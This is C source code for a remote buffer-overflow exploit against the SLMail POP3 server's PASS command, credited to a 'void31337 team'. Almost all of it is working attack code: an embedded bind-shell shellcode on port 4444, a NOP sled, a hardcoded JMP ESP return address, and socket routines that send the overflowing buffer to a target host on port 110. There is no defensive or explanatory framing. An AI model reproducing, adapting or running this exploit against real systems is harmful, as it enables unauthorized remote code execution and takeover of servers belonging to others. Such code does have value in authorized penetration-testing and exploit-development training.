/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xd9\xf7\xd9\x74\x24\xf4\x58\x33\xc9\xba\x15\x18\x8a\x1f\xb1"
"\x52\x31\x50\x17\x83\xc0\x04\x03\x45\x0b\x68\xea\x99\xc3\xee"
"\x15\x61\x14\x8f\x9c\x84\x25\x8f\xfb\xcd\x16\x3f\x8f\x83\x9a"
"\xb4\xdd\x37\x28\xb8\xc9\x38\x99\x77\x2c\x77\x1a\x2b\x0c\x16"
"\x98\x36\x41\xf8\xa1\xf8\x94\xf9\xe6\xe5\x55\xab\xbf\x62\xcb"
"\x5b\xcb\x3f\xd0\xd0\x87\xae\x50\x05\x5f\xd0\x71\x98\xeb\x8b"
"\x51\x1b\x3f\xa0\xdb\x03\x5c\x8d\x92\xb8\x96\x79\x25\x68\xe7"
"\x82\x8a\x55\xc7\x70\xd2\x92\xe0\x6a\xa1\xea\x12\x16\xb2\x29"
"\x68\xcc\x37\xa9\xca\x87\xe0\x15\xea\x44\x76\xde\xe0\x21\xfc"
"\xb8\xe4\xb4\xd1\xb3\x11\x3c\xd4\x13\x90\x06\xf3\xb7\xf8\xdd"
"\x9a\xee\xa4\xb0\xa3\xf0\x06\x6c\x06\x7b\xaa\x79\x3b\x26\xa3"
"\x4e\x76\xd8\x33\xd9\x01\xab\x01\x46\xba\x23\x2a\x0f\x64\xb4"
"\x4d\x3a\xd0\x2a\xb0\xc5\x21\x63\x77\x91\x71\x1b\x5e\x9a\x19"
"\xdb\x5f\x4f\x8d\x8b\xcf\x20\x6e\x7b\xb0\x90\x06\x91\x3f\xce"
"\x37\x9a\x95\x67\xdd\x61\x7e\x82\x29\x69\x93\xfa\x2f\x69\x6a"
"\x40\xa6\x8f\x06\xa6\xef\x18\xbf\x5f\xaa\xd2\x5e\x9f\x60\x9f"
"\x61\x2b\x87\x60\x2f\xdc\xe2\x72\xd8\x2c\xb9\x28\x4f\x32\x17"
"\x44\x13\xa1\xfc\x94\x5a\xda\xaa\xc3\x0b\x2c\xa3\x81\xa1\x17"
"\x1d\xb7\x3b\xc1\x66\x73\xe0\x32\x68\x7a\x65\x0e\x4e\x6c\xb3"
"\x8f\xca\xd8\x6b\xc6\x84\xb6\xcd\xb0\x66\x60\x84\x6f\x21\xe4"
"\x51\x5c\xf2\x72\x5e\x89\x84\x9a\xef\x64\xd1\xa5\xc0\xe0\xd5"
"\xde\x3c\x91\x1a\x35\x85\xb1\xf8\x9f\xf0\x59\xa5\x4a\xb9\x07"
"\x56\xa1\xfe\x31\xd5\x43\x7f\xc6\xc5\x26\x7a\x82\x41\xdb\xf6"
"\x9b\x27\xdb\xa5\x9c\x6d";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2606] = 0x5f4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP
      // \x8f\x35\x4a\x5f
      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
